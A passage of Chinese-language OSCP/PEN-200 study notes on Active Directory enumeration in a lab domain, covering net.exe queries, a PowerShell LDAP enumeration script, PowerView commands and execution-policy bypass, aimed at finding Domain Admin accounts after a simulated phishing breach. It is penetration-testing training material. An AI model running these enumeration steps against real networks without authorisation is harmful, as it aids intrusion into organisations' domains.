---
title: '[OSCP, PEN-200] Instructional notes - Part 6'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 6
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 5](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md) 內容

# Active Directory Introduction and Enumeration
[Active Directory Domain Services](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview) 通常稱為 Active Directory (AD) 允許 System Administrators 大規模更新和管理作業系統、應用程式、使用者和資料存取的服務。
## Active Directory - Introduction
Active Directory 本身就是一種服務，但它也充當 management layer。 AD 包含有關環境的關鍵資訊，儲存有關 `users`, `groups` 與 `computers` 的資訊，每個資訊稱為 objects。每個 object 上設定的權限決定了該物件在網域內的權限。
>[!Important]
>Active Directory（AD）環境高度依賴 Domain Name System（DNS） 服務。 因此，典型的 Domain Controller (DC) 通常也會同時運行 DNS 伺服器，並且 負責解析該網域的名稱（authoritative for a given domain）。

- 使用 [Organizational Units](https://en.wikipedia.org/wiki/Organizational_unit_(computing))（OU）來管理 objects
為了簡化管理，系統管理員通常會使用 Organizational Units 來分類不同的物件：\
OU 就像檔案系統的資料夾，用來存放 AD 內的物件。
    - `Computer objects` 代表 加入網域的伺服器或 workstation。
    - `User objects` 代表 可以登入網域的帳戶，並包含各種 attributes，如：
        - First Name
        - Last Name
        - Username
        - Phone Number等
- AD 運作機制: DC
當使用者嘗試登入網域時，會發送一個 request 到 Domain Controller (DC) 由 DC 來檢查該使用者是否有權限登入。
DC 是 整個網域的核心組件，存放所有：
    - OUs（組織單位）
    - Objects（物件）
    - Attributes（屬性）

因此當我們進行 AD 滲透測試時，會 特別關注 DC，因為它是 AD 最核心的目標之一。
- AD groups 與高權限帳戶
Objects 可以被分配到 AD Groups，這樣系統管理員就能夠一次性管理一組物件。例如：
某個 group member 可能會獲得 檔案伺服器存取權限。
某些 group 可能擁有 網域內的管理員權限。
     - (1) [Domain Admins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-admins)
    Domain Admins Group Member 是網域中擁有最高權限的 Objects 之一，擁有整個網域的管理權限。\
如果 attacker 成功獲取此群組內成員的帳號，就可以完全 控制整個網域。
     - (2) Enterprise Admins
    AD 環境可以擁有多個網域（Domain Tree 或 Domain Forest）。
每個網域都有自己的 Domain Admins 群組。\
     Enterprise Admins Group 則擁有「所有網域」的最高權限，能 管理整個 AD 樹狀結構中的所有網域。

Enumeration 會使用多種工具來進行手動與自動化枚舉，其中大部分工具都會透過 LDAP（[Lightweight Directory Access Protocol](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)） 來查詢 AD 內的物件資訊。

### Enumeration - Defining our Goals
如何透過 低權限帳號進行滲透測試。
[環境範例]
- 目標 滲透 `corp.com` 網域。
- 已經透過 Phishing Attack，成功取得了一個網域使用者的帳號密碼。
- 另一種可能是：目標組織主動提供我們一組使用者帳號，以模擬實際滲透測試（假設攻擊，Assumed Breach）。這樣可以幫助企業評估：如果攻擊者獲得初始存取權限，他們可以多快進行進一步的攻擊與 Lateral Movement。
- 可用帳號：
    - 帳戶是 stephanie
    - 具有 RDP 權限，可以連線到 Windows 11 workstation，該 workstation 已加入 corp.com 網域。
    - stephanie 並不是該機器的 Local Administrator ，這可能會影響我們執行某些命令或工具的權限。

#### Enumeration 的方式
從 stephanie 低權限帳號開始進行 AD enumeration，並且 透過這個帳號找到其他潛在的攻擊機會。**一旦我們獲取新的使用者帳號或電腦存取權限，就需要重新進行枚舉**。
- Pivoting(視角轉變) & Rinse and Repeat(反覆枚舉)
當我們獲得新帳號或新的電腦存取權限時，我們需要 重新枚舉:
    - 不同使用者的權限可能不同（即使表面上屬於相同的低權限使用者群組）。
    - 某些帳號可能擁有特定資源的存取權限，但 stephanie 可能沒有。
    - 系統管理員有時會額外賦予個別帳號更多權限，例如特定伺服器的存取權限。
    
### Active Directory - Manual Enumeration
stephanie 是低權限使用者，但有 RDP 存取權限
#### 1. 透過 RDP 登入 Windows 11
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:stephanie /d:corp.com /v:192.168.145.75

```
>[!Warning]
>**避免 Kerberos 雙重跳躍問題（[Kerberos Double-Hop](https://posts.slayerlabs.com/double-hop/) Issue）**:\
建議使用 RDP，而非 PowerShell Remoting（WinRM），因為透過 WinRM 可能會導致 無法執行 AD 枚舉工具。\
Kerberos 雙重跳躍（Double-Hop）問題 會影響某些遠端命令的執行權限，詳細內容可參考 PEN-300 課程。\
![image](https://hackmd.io/_uploads/HyDm7BhsJx.png)

#### 2. 使用 net.exe 枚舉 AD 的使用者
使用 `net user /domain` 來列出 corp.com 網域內的所有使用者
```
PS C:\Users\stephanie> net user /domain
The request will be processed at a domain controller for domain corp.com.


User accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
Administrator            dave                     Guest
iis_service              jeff                     jeffadmin
jen                      krbtgt                   pete
stephanie
The command completed successfully.
```
> `Administrator`：內建的網域管理員帳號。\
`krbtgt`：Kerberos 票證授權服務帳號，可能與 Kerberos 身份驗證有關。\
`jeffadmin`：帳號名稱帶有 "admin"，可能是管理員帳戶，值得調查。

#### 3. 查詢特定使用者資訊
使用 `net user` 指令，針對 jeffadmin 進行更詳細的查詢
```
PS C:\Users\stephanie> net user jeffadmin /domain
The request will be processed at a domain controller for domain corp.com.

User name                    jeffadmin
Full Name
...
Account expires              Never

...
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/8/2024 3:47:01 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```
> jeffadmin 是 **Domain Admins** group member\
密碼不會過期
>> 如果我們能夠獲取 jeffadmin 的 credential，就能直接擁有 Domain Admin 權限。

#### 4. 使用 net.exe 查詢 AD 的群組
使用 `net group /domain` 指令，來查看網域內所有的群組
```
PS C:\Users\stephanie> net group /domain
The request will be processed at a domain controller for domain corp.com.

Group Accounts for \\DC1.corp.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Debug
*Development Department
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Management Department
*Protected Users
*Read-only Domain Controllers
*Sales Department
*Schema Admins
The command completed successfully.
```
> [default Group](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)\
> `Domain Admins`: 整個網域的最高權限\
`Enterprise Admins`: 擁有多個網域的管理權限，通常在 Active Directory Forest 內才會出現\
`Sales Department`: 自訂群組，可能代表企業內部自行建立的部門群組

#### 5. 查詢特定群組的成員
針對 `Sales Department` 群組，查詢它有哪些成員
```
PS C:\Users\stephanie> net group "Sales Department" /domain
The request will be processed at a domain controller for domain corp.com.

Group name     Sales Department
Comment

Members

-------------------------------------------------------------------------------
pete                     stephanie
The command completed successfully.
```
> stephanie 及 pete 都是 Sales Department 群組

### Enumerating Active Directory using PowerShell and .NET Classes
如何利用 PowerShell 和 .NET 類別來枚舉 Active Directory（AD），並透過 LDAP 與 AD 互動

#### LDAP
>[!Note]
>LDAP（Lightweight Directory Access Protocol） 是一種用來查詢和修改目錄服務（如 Active Directory）的通訊協定。\
當使用者搜尋印表機、查詢使用者或群組資訊時，AD 會使用 LDAP 來處理查詢。\
LDAP 不僅限於 Active Directory，其他目錄服務（如 OpenLDAP）也使用 LDAP。
- LDAP 查詢路徑格式
需要特定的 [LDAP ADsPath](https://learn.microsoft.com/en-us/windows/win32/adsi/ldap-adspath?redirectedfrom=MSDN)格式 才能與 AD 溝通
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
> - `HostName`：電腦名稱、IP 地址或網域名稱。通常尋找擁有最新資訊的 DC ([Primary Domain Controller](https://learn.microsoft.com/en-gb/troubleshoot/windows-server/active-directory/fsmo-roles) (PDC))
> - `PortNumber`（可選）：預設情況下，LDAP 使用 389（非加密） 或 636（SSL/TLS 加密）。
> - `DistinguishedName`（DN）：唯一標識 AD 內 Objects 的名稱，例：`CN=Stephanie,CN=Users,DC=corp,DC=com`


#### 1. 取得 Primary Domain Controller（PDC）
>[!Tip]
>**為什麼需要 PDC？**\
AD 通常有多個 DCs，但其中只有一個 PDC 持有最新的網域資訊。\
為了確保枚舉結果最準確，我們應該查詢 PDC，而不是隨機的 DC。

使用 .NET 類別 `System.DirectoryServices.ActiveDirectory.Domain` 來獲取當前網域資訊：
```
PS C:\Users\stephanie> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```
> PdcRoleOwner 欄位顯示 DC1.corp.com，表示 DC1 是 PDC

#### 2. 取得網域的 DN（Distinguished Name）
在 AD 中，每個 Objects 都有一個唯一識別名稱（DN，Distinguished Name）\
使用 ADSI（[Active Directory Services Interface](https://learn.microsoft.com/en-us/windows/win32/adsi/active-directory-service-interfaces-adsi)） 來取得網域的 DN
```
PS C:\Users\stephanie> ([adsi]'').distinguishedName
DC=corp,DC=com
```
>  透過 LDAP 查詢所需的 Distinguished Name

#### 3. 組合完整的 LDAP 查詢路徑
現在我們已經獲取：
- PDC 名稱（DC1.corp.com）
- 網域的 DN（DC=corp,DC=com）

將這些資訊組合成 LDAP 查詢路徑：
```
PS C:\Users\stephanie> $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
PS C:\Users\stephanie> $DN = ([adsi]'').distinguishedName
PS C:\Users\stephanie> $LDAP = "LDAP://$PDC/$DN"
PS C:\Users\stephanie> $LDAP
LDAP://DC1.corp.com/DC=corp,DC=com
```

#### 4. 完整 PowerShell Enumeration 腳本
```
# 取得 PDC 名稱
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

# 取得 DN（Distinguished Name）
$DN = ([adsi]'').distinguishedName 

# 組合 LDAP 路徑
$LDAP = "LDAP://$PDC/$DN"

# 顯示 LDAP 路徑
$LDAP
```
自動偵測 PDC 並生成正確的 LDAP 查詢路徑，使用 notepad 編輯寫成 `enumeration.ps1`
```
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> notepad .\enumeration.ps1

$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
$LDAP

PS C:\Users\stephanie> .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```

### Adding Search Functionality to our Script
已經建置了所需的 LDAP 路徑，現在可以建立搜尋功能
#### 1. 使用 .NET 類別來進行 AD 搜尋
將使用 System.DirectoryServices 命名空間中的兩個重要類別：
- [DirectoryEntry](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0)：
代表 AD 內的一個物件（如 CN=Users,DC=corp,DC=com）。
我們將用它來指定 搜尋的起點（[SearchRoot](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher.searchroot?view=dotnet-plat-ext-6.0) property）。
- [DirectorySearcher](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0)：
用來 執行 LDAP 查詢。
SearchRoot 屬性會指向 DirectoryEntry，告訴它 從哪裡開始搜尋。

>[!Note]
>- The DirectoryEntry class encapsulates an object in the AD service hierarchy (LDAP path)
>- The DirectorySearcher class performs queries against AD using LDAP. When creating an instance of DirectorySearcher, we must specify the AD service we want to query in the form of the SearchRoot property.
>- The DirectorySearcher documentation lists `FindAll()`, which returns a collection of all the entries found in AD.

```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

# 建立 DirectoryEntry 來指定搜尋的起點
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

# 建立 DirectorySearcher 來執行 LDAP 查詢
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```
#### 2. 在腳本中實作基本搜尋
編輯腳本:
```
PS C:\Users\stephanie> powershell -ep bypass    
PS C:\Users\stephanie> notepad .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()

PS C:\Users\stephanie> .\enumeration.ps1

Path
----
LDAP://DC1.corp.com/DC=corp,DC=com
LDAP://DC1.corp.com/CN=Users,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Computers,DC=corp,DC=com
LDAP://DC1.corp.com/OU=Domain Controllers,DC=corp,DC=com
LDAP://DC1.corp.com/CN=System,DC=corp,DC=com
LDAP://DC1.corp.com/CN=LostAndFound,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Infrastructure,DC=corp,DC=com
LDAP://DC1.corp.com/CN=ForeignSecurityPrincipals,DC=corp,DC=com
LDAP://DC1.corp.com/CN=Program Data,DC=corp,DC=com
...

```
> 執行成功，但沒有過濾，結果過於龐大。
#### 3. 過濾搜尋結果
可以使用 LDAP 過濾條件\
只想查詢 所有使用者帳戶，可以使用 samAccountType=805306368：
```
$dirsearcher.filter="samAccountType=805306368"
```
編輯腳本並執行:
```
PS C:\Users\stephanie> notepad .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()

PS C:\Users\stephanie> .\enumeration.ps1

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, usnchanged...}
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcategory, dscorepropagatio...
```
> 篩選出 AD 內所有的使用者帳號

我們的腳本列舉了比 net.exe 更多的群組，包括 Print Operators, IIS_IUSRS 等。這是因為我們列舉了所有 AD 對象，包括 Domain Local groups（而不僅僅是 global groups）。

#### 4. 查詢特定帳號 attribute
目前查詢中只顯示物件的 LDAP 路徑，若要列出每個使用者的詳細屬性。\
使用兩層迴圈來列出每個使用者的所有屬性：
```
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```
編輯腳本並執行:
```
PS C:\Users\stephanie> type .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}

PS C:\Users\stephanie> .\enumeration.ps1
...
logoncount                     {173}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}
name                           {jeffadmin}
pwdlastset                     {133066348088894042}
objectclass                    {top, person, organizationalPerson, user}
samaccounttype                 {805306368}
memberof                       {CN=Domain Admins,CN=Users,DC=corp,DC=com}
...
-------------------------------

```
> 可以查詢每個帳號的登入次數、密碼設定時間、所屬群組等關鍵資訊
> 只列出 `jeffadmin` 資訊

>[!Caution]
> 若遇到以下 Error，PowerShell 執行原則（Execution Policy） 禁止運行腳本，可以透過調整設定: `Set-ExecutionPolicy Unrestricted -Scope CurrentUser`
> 
>```
>PS C:\Users\stephanie> .\enumeration.ps1
>.\enumeration.ps1 : File >C:\Users\stephanie\enumeration.ps1 cannot be loaded >because running scripts is disabled on
>this system. For more information, see >about_Execution_Policies at >https:/go.microsoft.com/fwlink/?LinkID=135170.
>At line:1 char:1
>+ .\enumeration.ps1
>+ ~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : SecurityError: (:) [], >PSSecurityException
>    + FullyQualifiedErrorId : UnauthorizedAccess
>PS C:\Users\stephanie> Set-ExecutionPolicy Unrestricted ->Scope CurrentUser
>```

#### 5. 查詢特定使用者的群組
若只想 查看某個特定帳號的群組，可以修改過濾條件：
```
$dirsearcher.filter="name=jeffadmin"

$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}

```
執行結果：
```
PS C:\Users\stephanie> type .\enumeration.ps1
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="name=jeffadmin"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop.memberof
    }

    Write-Host "-------------------------------"
}
PS C:\Users\stephanie> .\enumeration.ps1
CN=Domain Admins,CN=Users,DC=corp,DC=com
CN=Administrators,CN=Builtin,DC=corp,DC=com
-------------------------------
```
> 證明 jeffadmin 是 Domain Admins 成員，擁有最高權限！

#### 6. 讓腳本更靈活
避免手動修改搜尋條件，可以將它轉換為函數（Function），並允許 命令列參數：
```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
先執行 enumeration.ps1，就可以直接使用 LDAPSearch\
`LDAPSearch -LDAPQuery "(samAccountType=805306368)"`
```
PS C:\Users\stephanie> type .\enumeration.ps1
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
PS C:\Users\stephanie> . .\enumeration.ps1
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(samAccountType=805306368)"

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcategory, description...}
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, usnchanged...}
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcategory, dscorepropagatio...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcategory, dscorepropagatio...

```
直接查詢 AD
```
LDAPSearch -LDAPQuery "(samAccountType=805306368)"  # 查詢所有使用者
LDAPSearch -LDAPQuery "(objectclass=group)"  # 查詢所有群組
LDAPSearch -LDAPQuery "(name=jeffadmin)"  # 查詢 jeffadmin
```
#### 7. foreach 每個 group 與 member
為了列舉網域中可用的每個群組並顯示使用者成員，我們可以將輸出匯入到一個新變數中，並使用 foreach 循環列印群組的每個屬性。
```
PS C:\Users\stephanie\Desktop> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }
...
Sales Department              {CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
Management Department         CN=jen,CN=Users,DC=corp,DC=com
Development Department        {CN=Management Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=dave,CN=Users,DC=corp,DC=com}
...
```
上述在 Sales Department group 只看到 `pete` 與 `stephanie`
```
PS C:\Users\stephanie> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
PS C:\Users\stephanie> $sales.properties.member
CN=Development Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=stephanie,CN=Users,DC=corp,DC=com
```
> 發現 `Development Department` 也是 Sales Department group 其中一員

### AD Enumeration with PowerView
介紹了一款強大的 Active Directory 枚舉工具 — [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/)，它是一個 PowerShell 腳本，提供很多內建函數

#### 1. 如何載入 PowerView？
PowerView 已安裝在 `C:\Tools` 資料夾中
```
PS C:\Tools> . .\PowerView.ps1
```
或
```
PS C:\Tools> Import-Module .\PowerView.ps1
``` 
#### 2. 取得基本網域資訊
##### 2.1  查詢網域資訊 (Get-NetDomain)
```
PS C:\Tools> Get-NetDomain


Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```
##### 2.2 查詢所有網域使用者 (Get-NetUser)
```
PS C:\Tools> Get-NetUser

logoncount             : 565
badpasswordtime        : 3/1/2023 3:18:15 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 3/8/2025 9:00:20 AM
name                   : Administrator
objectsid              : S-1-5-21-1987370270-658905905-1781884369-500
samaccountname         : Administrator
```
> 包含：\
帳號名稱（samaccountname）\
是否是管理員（admincount）\
所屬群組（memberof）\
上次修改密碼時間（pwdlastset）\
上次登入時間（lastlogon）
##### 2.3 查詢使用者資訊 (Get-NetUser | select ..)
- 只顯示使用者名稱 (`Get-NetUser | select cn`)
```
PS C:\Tools> Get-NetUser | select cn

cn
--
Administrator
Guest
krbtgt
dave
stephanie
jeff
jeffadmin
iis_service
pete
jen
```
- 查詢使用者修改密碼與登入資訊 (`Get-NetUser | select cn,pwdlastset,lastlogon`)
```
PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon

cn            pwdlastset            lastlogon
--            ----------            ---------
Administrator 8/16/2022 5:27:22 PM  3/8/2025 9:04:00 AM
Guest         12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM
krbtgt        9/2/2022 4:10:48 PM   12/31/1600 4:00:00 PM
dave          9/7/2022 9:54:57 AM   3/8/2025 9:12:35 AM
stephanie     9/2/2022 4:23:38 PM   3/8/2025 9:01:06 AM
jeff          9/2/2022 4:27:20 PM   12/18/2023 11:55:16 PM
jeffadmin     9/2/2022 4:26:48 PM   1/8/2024 3:47:01 AM
iis_service   9/7/2022 5:38:43 AM   3/1/2023 3:40:02 AM
pete          9/6/2022 12:41:54 PM  2/1/2023 2:42:42 AM
jen           9/6/2022 12:43:01 PM  1/8/2024 1:26:03 AM
```
##### 2.4 查詢所有網域群組 (Get-NetGroup)
```
PS C:\Tools> Get-NetGroup | select cn

cn
--
...
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Sales Department
Management Department
Development Department
Debug
```
##### 2.5 查詢特定群組的成員 (Get-NetGroup .. | select member)
查詢 Sales Department 的成員：
```
PS C:\Tools> Get-NetGroup "Sales Department" | select member

member
------
{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}

```
> 再次證明 Development Department 也是 Sales Department 的成員

>[!Important]
>`PowerView` vs `net.exe`\
>![image](https://hackmd.io/_uploads/r1Y83xqoye.png)


## Manual Enumeration - Expanding our Repertoire
深入 Active Directory（AD）環境的手動枚舉，透過各種技術收集更多關鍵資訊，並建立一個完整的網域地圖
### Enumerating Operating Systems
使用 PowerView 查詢 Active Directory（AD）內的所有電腦資訊，並確認作業系統類型
#### 1. 使用 PowerView 查詢網域內的所有電腦 (Get-NetComputer)
```
PS C:\Tools> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Get-NetComputer

pwdlastset                    : 10/2/2022 10:19:40 PM
logoncount                    : 319
msds-generationid             : {89, 27, 90, 188...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/13/2022 11:37:06 AM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 10/13/2022 6:37:06 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
...
dnshostname                   : DC1.corp.com
...
```
#### 2. 過濾並清理輸出資訊 (Get-NetComputer | select operatingsystem,dnshostname)
```
PS C:\Tools> Get-NetComputer | select name,operatingsystem,dnshostname

name     operatingsystem              dnshostname
----     ---------------              -----------
